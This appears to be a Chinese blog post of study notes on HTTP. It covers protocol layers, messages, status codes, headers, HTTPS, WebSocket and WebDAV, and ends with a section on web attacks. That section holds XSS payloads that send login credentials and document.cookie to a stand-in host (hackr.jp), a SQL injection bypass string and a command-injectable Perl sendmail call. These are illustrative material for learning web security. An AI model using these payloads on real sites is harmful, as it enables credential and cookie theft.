---
title: HTTP原理
date: 2019-01-17 22:03:18
tags: HTTP
categories: HTTP
keywords: [HTTP,原理]
description:
---

TCP/IP协议族
-------------
### 重要思想:`分层`
### 分层：
+ 应用层：
> HTTP协议：生成针对目标web服务器的HTTP请求报文。
> FTP协议：文件传输协议。
> DNS协议： 域名解析协议。

<!--more-->

+ 传输层：
> UDP协议：用户数据报协议。
> TCP协议：传输控制协议：利用三次握手策略。
![Alt text][01]
[01]: ../assets/http/tcp3handmake.gif


+ 网络层:
> IP协议：把各种数据包传送给对方。
> ARP协议：解析地址协议，通过IP地址查出对应MAC地址。

+ 链路层：用于处理网络的硬件部分。

URI/URL
-------------
+ URI：用字符串标识某一互联网资源。
+ URL： 互联网上所处的位置表示资源地点。
```
https://user:pass@wwww.example.com:80/dir/index.html?uid=1#ch1
```
|    组成   |    解释   |
|:-------:|:-----------:|
|   https  |     协议方案    | 
|   user:pass  |     登录信息    | 
|   wwww.example.com  |     服务器地址    | 
|   :80  |     端口号    | 
|   dir/index.html  |     文件路径    | 
|   uid=1  |     查询字符串    | 
|   #ch1  |     片段标识符    | 

HTTP协议
-------------
### 请求响应：
+ 请求报文：
```
POST    /from/entry   HTTP/1.1
Host: hacker.jp
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 16
name: ueno&age=37
```

+ 响应报文：
```
HTTP/1.1  200  OK
Date: Tue, 10 Jul 2012 06:50:15 GMT
Content-Length: 362
Content-Type: text/html
<html> ......
```

### HTTP可使用方法：
+ GET：获取资源，目的是获取响应的主体内容。
+ POST：传输实体主体。
+ PUT：传输文件，要求在请求报文中包含文件内容，保存到请求URI指定位置。
+ HEAD：获取报文首部，用于确认URI有效性及资源更新的日期时间。
+ DELETE：删除文件，删除URI指定资源。
+ OPTIONS：询问支持的方法，查询针对请求URI指定资源支持的方法。
+ TRACE：追踪路径，用来确认连接过程中发生的一系列操作。
+ CONNECT：要求用隧道协议连接代理。

### 状态码：
+ 状态码类别：

|    状态码   |    分类   |    解释   |
|:-------:|:-----------:|:-----------:|
|   1xx  |     Infromational(信息性状态码)    |    接收的请求正在处理   |
|   2xx  |     Success(成功状态码)    |    请求正常处理完成   | 
|   3xx  |     Redirectiion(重定向状态码)    |    需要进行附加操作以完成请求   |
|   4xx  |     Client Error(客户端错误状态码)    |    服务器无法处理请求   |
|   5xx  |     Server Error(服务器错误状态码)    |    服务器处理请求出错   |

+ 常用状态码：

|    状态码   |    解释   |
|:-------|:-----------|
|   200 OK  |     从客户端发来的请求在服务端被正常处理了    | 
|   204 No Content  |     服务器接受的请求已成功处理，但返回的响应报文不含实体主体    | 
|   206 Partial Content  |     客户端进行了范围请求    | 
|   301 Moved Permanently  |    永久性重定向    | 
|   302 Found  |     临时性重定向，请求的资源已被分配了新的URI    | 
|   303 See Other  |     与302有着相同功能，但明确要求采用GET获取资源    | 
|   304 Not Modified  |     客户端发送附带条件请求时，服务端允许请求访问，但未满足条件    | 
|   307 Temporary Redirect  |    与302有相同含义，但不会使POST变成GET    | 
|   400 Bad Request  |    请求报文种存在语法错误    | 
|   401 Unauthorized  |    需通过HTTP认证，若已进行过一次请求，则表示认证失败    | 
|   403 Forbidden  |    请求资源的访问被服务器拒绝    | 
|   404 Not Found  |    服务器上无法找到请求的资源    | 
|   500 Internal Server Error  |    服务器端在执行请求时发生了错误    | 
|   503 Service Unavailable  |    服务器暂处于超负载或正在进行停机维护，无法处理请求    | 

### 通信数据转发程序：
#### 代理：
+ 作用：接收由客户端发送的请求并转发给服务器，接收服务器相应转发给客户端，转发时，需要附加Via首部字段以标记出经过的主机信息。
+ 使用理由：
> 利用缓存技术减少网络带宽的流量
> 组织内部针对特定网站的访问控制
> 以获取访问日志为主要目的
+ 分类：
> 缓存代理：会预先将资源的副本保存在代理服务器
> 透明代理：不对报文做任何加工的代理类型为透明代理

#### 网关：
+ 作用：工作机制和代理十分相似，而网关能使通信线路上的服务器提供非HTTP协议。

#### 隧道：
+ 作用：建立一条与其他服务器通信的线路，确保客户端能与服务器进行安全的通信。

### HTTP首部字段：
#### 类型：
+ 通用首部字段：请求报文和响应报文两方都会使用的首部
+ 请求首部字段：请求报文使用的首部
+ 响应首部字段：响应报文使用的首部
+ 实体首部字段：补充了资源内容更新时间等实体有关的信息

#### End-to-end首部和Hop-to-hop首部：
+ 端到端首部(End-to-end)：分在此类的首部会转发给请求/想一个的最终接受目标。
+ 逐跳首部(Hop-to-hop)：分在此类的首部支队单词转发有效，会因通过缓存代理不转发。

#### 通用首部字段：
+ Cache-Control：操作缓存的工作机制
+ Connection：控制不再转发给代理的首部字段，管理持久连接
+ Date：表明创建HTTP报文的日期和时间
+ Pragma：要求所有的中间服务器不返回缓存的资源
+ Trailer：事先说明在报文主体后记录了哪些首部字段，可应用于分块传输编码
+ Upgrade：用于检测HTTP协议及其协议是否可使用更高的版本进行通信
+ Via：追踪客户端与服务器之间的请求和响应报文的传输路径
+ Warning:HTTP/1.0：响应首部演变过来，通常会告知用户一些与缓存相关的问题的警告

#### 请求首部字段：
+ Accept：通知服务器用户代理可处理的媒体类型及媒体类型的相对优先级顺序
+ Accept-Charset：通知服务器用户代理支持的字符集及字腹肌的相对优先级顺序
+ Accept-Encoding：通知服务器用户代理支持的内容编码及内容编码的相对优先级顺序
+ Accept-Language：通知服务器用户代理支持的自然语言集及其相对优先级顺序
+ Authorization：通知服务器用户代理的认证信息
+ Expect：期望出现某种特定行为，服务器无法理解作出回应时，返回417 Expectation Failed
+ From：使用用户代理的用户的电子邮件地址
+ Host：请求资源所处的互联网主机名和端口号
+ If-Match：匹配资源所用的实体标记值
+ If-Modified-Since：请求指定日期后更新过的资源
+ If-None-Match：当实体标记(Etag)与请求资源的Etag不一致时，处理请求
+ If-range：If-range字段值若是和Etag值的更新日期时间一致，则做范围请求处理
+ If-Unmodified-Since：请求在指定日期后未发生更新的资源
+ Max-Forwards：指定可经过的服务器最大数目
+ Proxy-Authorization：通知服务器认证所需要的信息
+ Range：通知服务器资源的指定范围
+ Referer：通知服务器请求的原始资源的URI
+ TE：通知服务器客户端能够处理响应的传输编码方式及其相对优先级顺序
+ User-Agent：将创建请求的浏览器和用户代理名称等信息传输给服务器

#### 响应首部字段：
+ Accept-Ranges：用来告知客户端服务器是否能处理范围请求
+ Age：告知客户端源服务器在多久前创建了响应，单位为妙
+ Etag：告知客户端实体标记，可将资源以字符串形式做唯一性标识的方式
+ Location：将响应接收方引导至某个与请求URI位置不同的资源
+ Proxy-Authenticate：把由代理服务器所要求的的认证信息发送给客户端
+ Retry-After：告知客户端在多久之后再次发送请求
+ Server：告知客户端当前服务器上安装的HTTP服务器应用程序的信息
+ Vary：可对缓存进行控制
+ www-Authenticate：告知客户端适用于访问请求URI所指定资源的认证方案

#### 实体首部字段：
+ Allow：通知客户端能够支持Request-URI制定资源的所有HTTP方法
+ Content-Encoding：告知客户端服务器对实体的主体部分选用的内容编码方式
+ Content-Language：告知客户端实体主体使用的自然语言
+ Content-Length：表明了实体主体部分的大小
+ Content-Location：与报文主体部分相对应的URI
+ Content-MD5：检查报文主体在传输过程中是否保持完整，以及确认传输到达
+ Content-Range：告知客户端作为响应返回的实体的哪个部分符合范围请求
+ Content-Type：说明了实体主体内对象的媒体类型
+ Expires：将资源失效的日期告知客户端
+ Last-Modified：指明资源最终修改的时间

#### 为Cookie服务的首部字段：
+ Set-Cookie：
> expires属性：指定浏览器可发送Cookie的有效期
> path属性：限制指定Cookie的发送范围的文件目录
> domain属性：作为Cookie适用对象的域名
> secure属性：仅在HTTPS安全通信时才会发送Cookie
> HttpOnly属性：加以限制，使Cookie不能被JavaScript脚本访问

+ Cookie：当客户想获得HTTP状态管理支持时，就会在请求中包含从服务器接受的Cookie

#### 其他首部字段：
+ X-Frame-Options：用于控制网站内容在其他Web网站的Frame标签内的现实问题，防止点击劫持攻击
+ X-XSS-Protection：针对跨站脚本攻击(XSS)的一种对策，用于控制浏览器XSS防护机制的开关
+ DNT：意为拒绝个人信息被收集，表示拒绝被精准广告追踪的一种方法
+ P3P：利用P3P技术让Web网站上的个人隐私变成一种仅供程序可理解的形式

HTTP和HTTPS
-------------
### HTTP的缺点：
+ 通信使用明文(不加密)，内容可能会被窃听
+ 不验证通信方的身份，因此有可能遭遇伪装
+ 无法证明报文的完整性，所以有可能已遭篡改

### HTTPS：
#### 定义：
+ HTTPS实在HTTP通信接口部分用SSL和TLS协议代替
+ 添加了加密及认证机制的HTTP成为HTTPS

#### 安全通信机制：
![Alt text][02]
[02]: ../assets/http/httpsProcess.jpg

### HTTP认证：
+ Basic认证：采用Base64编码，发送明文密码
+ Digest认证：使用质询/响应方式
+ SSL客户端认证：借由HTTPS的客户端证书完成认证
+ 基于表单认证：最常用，并用Cookie来管理Session会话

基于HTTP的功能追加协议
-------------
### SPDY
#### HTTP的瓶颈：
+ 一条连接上只可发送一个请求
+ 请求只能从客户端开始，客户端不可以接收响应以外的指令
+ 请求/响应首部未经压缩就发送，首部信息越多延迟越大
+ 发送冗长的首部，每次互相发送相同的首部造成的浪费较多
+ 可任意选择数据压缩格式，非强制压缩发送

#### 解决方法：
+ Ajax：异步请求实现局部刷新，但可能存在大量请求产生
+ Comet：一旦服务器内容更新了，可以立即反馈给客户端
+ SPDY：
> 以会话层的形式加入，控制对数据的流动，但还是采用HTTP建立通信连接
> `HTTP` 应用层
> `SPDY` 会话层
> `SSL` 表示层
> `TCP` 传输层
> 多路复用流：通过单一的TCP连接，可以无限制处理多个HTTP请求
> 赋予请求优先级：可以给请求逐个分配优先级顺序
> 压缩HTTP首部：压缩HTTP请求和响应的首部
> 推送功能：支持服务器主动向客户端推送数据的功能
> 服务器提示功能：服务器可以主动提示客户端请求所需的资料

### WebSocket
#### 定义:
+ 即Web浏览器与Web浏览器服务器之间全双工通信标准

#### 特点:
+ 推送功能：支持由服务器向客户端推送数据的推送功能
+ 减少通行量：只要建立起WebSocket连接，就希望一直保持连接状态

#### WebSocketAPI:
+ JavaScript可调用API，实现WebSocket协议下全双工通信

```
var socket = new WebSocket('ws://game.example.com:12010/updates');
socket.onopen = function(){
    setInternal(function(){
        if(socket.bufferedAmout == 0){
            socket.send(getUpdateData());
        }
    },50);
}
```

### WebDAV
#### 定义:
+ WebDAV是一个可对Web服务器上的内容直接进行文件复制、编辑等操作的分布式文件系统

#### 引入概念:
+ 集合(Collection)：是一种统一管理多个资源的概念，以集合为单位可进行各种操作
+ 资源(Resource)：把文件或集合称为资源
+ 属性(Property)：定义资源的属性
+ 锁(Lock)：把文件设置成无法编辑状态

#### 新增方法及状态码:
+ PROPFIND：获取属性
+ PROPPATCH：修改属性
+ MKCOL：创建集合
+ COPY：复制资源及属性
+ MOVE：移动资源
+ LOCK：资源加锁
+ UNLOCK：资源解锁

|    状态码   |    解释   |
|:-------|:-----------|
|   102 Processing  |     可正常处理请求，但目前是处理中状态    | 
|   207 Multi-Status  |     存在多种状态    | 
|   422 Unprocessible Entity  |     格式正确，内容有误    | 
|   423 Locked  |    资源已被加锁    | 
|   424 Failed Dependency  |     处理与某请求关联的请求失败，因此不再维持依赖关系    | 
|   507 Insufficient Storage  |     保存空间不足    | 

Web的攻击技术
-------------
### 跨站脚本攻击(XSS)
#### 定义:
+ 是指通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或JavaScript进行的一种攻击

#### 造成影响:
+ 利用虚假输入表单骗取用户个人信息
+ 利用脚本窃取用户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求
+ 显示伪造的文章或图片

#### 攻击案例:
+ 获取用户登录信息

```
http://example.jp/Login?ID="><script>var tf=document.getElemenById('login');tf.action='http://hackr.jp/pwget';tf.method='get';</script><span ts="
```

+ 对用户Cookie的窃取攻击

```
http://example.jp/login?ID="><script src=http://hackr.jp/xss.js></script>"
xss.js文件：
var content = escape(document.cookie);
document.write("<img src=http://hackr.jp/?");
document.write(content);
document.write(">");
```

### SQL攻击
#### 定义:
+ 指针对Web应用使用的数据库通过运行非法的SQL而产生的攻击

#### 造成影响:
+ 非法查看或篡改数据库内的数据
+ 规避认证
+ 执行和数据库服务器业务关联的程序等

#### 攻击案例:

```
http://example.com/search?q=marry'--
select * from bookTbl where author="marry" --' and flag=1;
```

### OS命令注入攻击
#### 定义:
+ 指通过Web应用，执行非法的操作系统命令达到攻击的目的

#### 攻击案例:

```
my $adr = $q -> param('mailaddress');
open(MAIL,"|/user/sbin/senmail  $adr");
print MAIL "Form:info@example.com\n";
```

### HTTP首部注入攻击
#### 定义:
+ 是指攻击者通过在响应首部字段内插入换行，添加任意响应首部或主体的一种攻击

### 邮件首部注入攻击
#### 定义:
+ 是指Web应用中的邮件发送功能，攻击者通过向邮件首部To或Subject内任意添加非法内容发起的攻击

### 目标遍历攻击
#### 定义:
+ 是指对本无意公开的文件目录，通过非法截断其目录路径后，达成访问目的的一种攻击

### 跨站点请求伪造(CSRF)
#### 定义:
+ 指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新

### 点击劫持
#### 定义:
+ 指利用透明的按钮或链接做成陷阱覆盖在Web页面之上

### DoS攻击
#### 定义:
+ 是一种让运行中的服务呈停止状态的攻击